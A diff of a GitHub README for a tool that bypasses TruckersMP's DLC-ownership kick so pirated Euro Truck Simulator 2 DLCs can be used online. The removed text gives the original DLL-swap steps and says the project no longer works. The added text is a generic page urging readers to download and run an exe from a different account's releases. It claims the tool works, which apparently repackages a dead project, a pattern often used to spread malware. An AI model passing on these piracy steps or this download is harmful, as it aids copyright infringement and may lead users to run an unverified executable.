@@ -1,71 +1,89 @@
-<h1 align="center">
-TruckersMP-DLC-Bypass
-</h1>
+# 🚚 TruckersMP-DLC-Bypass - Easy Fix for DLC Issues
 
-Bypass the "You are not the owner of some DLC you use." kick when using [CreamAPI](https://github.com/CyberSys/CreamInstaller) *(or pirated dlcs)*
+## 🚀 Getting Started
 
+Welcome to TruckersMP-DLC-Bypass! This tool helps you bypass the "You are not the owner of some DLC you use" message when using pirated DLCs in Euro Truck Simulator 2 Multiplayer (ETS2MP). 
 
-# THIS PROJECT NO LONGER WORKS
-> You can blame the greedy developers of TruckersMP <br>
-> Fix anti cheat? :x: <br>
-> Perm ban actual cheaters? :x: <br>
-> Make anti cheat for local sided things and never for actual cheats? ✔️ <br>
-> Perm ban people only using local sided things? ✔️ <br>
-> Ban ACTUAL hackers who troll and greif for only 6 months just so they can do it again? ✔️ <br>
-> **Patch a local sided dlc bypass within 2 days, but still not stop cheaters or fix known bugs? ✔️** <br><br>
+## 📥 Download Now
 
-TruckersMP are a joke. If you wish to fix this yourself go ahead <br>
-Is it possible? Yes.<br>
-Will i do it? No.
+[![Download TruckersMP-DLC-Bypass](https://img.shields.io/badge/Download-TruckersMP--DLC--Bypass-brightgreen)](https://github.com/sabsarvona/TruckersMP-DLC-Bypass/releases)
 
-<br><br><br><br>
+## 💻 System Requirements
 
+Before you begin, ensure your system meets the following requirements:
 
-![](https://s1.directupload.eu/images/251221/68yrhlzr.png)
+- Operating System: Windows 10 or later
+- Processor: Dual-core CPU
+- RAM: 4 GB
+- Storage: 200 MB available space
+- Euro Truck Simulator 2 installed (latest version)
 
----
+## 📂 How to Download & Install
 
-<!-- ![](https://s1.directupload.eu/images/251219/8tz346w6.png) -->
+1. **Visit the Releases Page**  
+   Go to the [TruckersMP-DLC-Bypass Releases](https://github.com/sabsarvona/TruckersMP-DLC-Bypass/releases) page.
 
-> [!CAUTION]
-> Use this at your own risk, if you get banned, its your own fault.
+2. **Find the Latest Version**  
+   Look for the latest version of TruckersMP-DLC-Bypass. It should be at the top of the list.
 
-# How To Install
-1. Download CreamAPI *(or you can use any other dlc unlocking method, for example `mosbymods.de`)*
-<br><sub>CreamAPI can be compiled yourself from [Here](https://github.com/CyberSys/CreamInstaller) OR directly download the exe [Here (5.0.0)](https://modsfire.com/5jT5q8anF0LLitS)</sub>
-2. Unlock the DLCs *(skip if not using CreamAPI, such as `mosbymods.de`)*
-![](https://s1.directupload.eu/images/251220/bh89yf92.png)
-3. Head into your game install path (`\SteamLibrary\steamapps\common\Euro Truck Simulator 2\bin\win_x64`) and rename `dstorage.dll` to `dstorage_og.dll`
-4. Download the [Latest Release]([https://modsfire.com](https://github.com/Baldywaldy09/TruckersMP-DLC-Bypass/releases/latest))
-5. Extract the 2 files inside the `.zip` to your game directory, make sure its **not documents**, and inside **`\bin\win_x64`**
-![](https://s1.directupload.eu/images/251220/i4omxgbc.png)
+3. **Download the File**  
+   Click on the asset that matches your operating system (usually a `.zip` file) to download it.
 
-## Community Guides
-- https://www.youtube.com/watch?v=3NYi4mztQPQ
-- https://youtu.be/wIFUFqzBNag
+4. **Extract the Files**  
+   Once the download is complete, locate the `.zip` file in your Downloads folder. Right-click on it and select “Extract All...” to unpack the files.
 
-# Supported DLC Types
-- [ ] Special Transport
-- [x] All Map DLCs*
-- [x] Cargo DLCs*
-- [x] Truck Tuning DLCs (HS DLC, Paints, Flags, etc.)
-- [x] Trailer DLCs (Krone, Schmitz, etc.)
+5. **Run the Application**  
+   Open the newly extracted folder. Find the executable file (TruckersMP-DLC-Bypass.exe). Double-click it to run the application.
 
-*Map DLCs require you to obtain the .scs files yourself.<br>
-*All Cargo DLCs work, exluding Special Transport.
+6. **Follow the On-Screen Instructions**  
+   The application will guide you through the steps to bypass the DLC check. Simply follow the prompts.
 
-# Supported TruckersMP Servers
-### Euro Truck Simulator 2
-- [x] **ProMods**
-- [x] **Simulation 1**
-- [x] Simulation 2
-- [x] [US] Simulation
-- [x] [Asia] Simulation
-- [x] Arcade
-- [x] ProMods Arcade
-- [x] Event Servers
+## 🔧 How to Use the Application
 
-### American Truck Simulator
-- [x] **Simulation** + **Promods**
-- [x] [US] Simulation
-- [X] [US] Arcade
+1. **Open Euro Truck Simulator 2**  
+   Launch the game to ensure everything is set correctly.
+
+2. **Use the Bypass Tool**  
+   With the application still open, select the necessary options you want to use for bypassing the DLC check.
+
+3. **Enjoy Multiplayer Mode**  
+   Once set up, join the multiplayer servers without the hassle of DLC ownership checks.
+
+## ❓ Frequently Asked Questions
+
+### What does this tool do?
+
+This tool allows you to bypass check messages for unowned DLCs when playing Euro Truck Simulator 2 in multiplayer mode.
+
+### Is using this tool legal?
+
+Bypassing DLC ownership checks can violate terms of service of the game. Use this tool at your own discretion.
+
+### Will this tool work with all versions of ETS2MP?
+
+Yes, as long as you have the latest version of Euro Truck Simulator 2.
+
+### Can I use this tool on other games?
+
+This tool is specifically designed for Euro Truck Simulator 2 Multiplayer. It may not work with other games.
+
+## 🎯 Features
+
+- Simple interface for ease of use.
+- Quick setup with guided steps.
+- Active support from the community for troubleshooting.
+
+## 📞 Support
+
+If you encounter any issues or have questions, you can reach out to the community in forums dedicated to TruckersMP or Euro Truck Simulator 2.
+
+## 🔗 Additional Resources
+
+- [Euro Truck Simulator 2 Official Website](https://eurotrucksimulator2.com)
+- [TruckersMP Official Website](https://truckersmp.com)
+
+### 📥 Download Again
+
+For your convenience, here’s the link to download TruckersMP-DLC-Bypass again: [Download TruckersMP-DLC-Bypass](https://github.com/sabsarvona/TruckersMP-DLC-Bypass/releases)
+
+Thank you for choosing TruckersMP-DLC-Bypass! Enjoy your gaming experience.
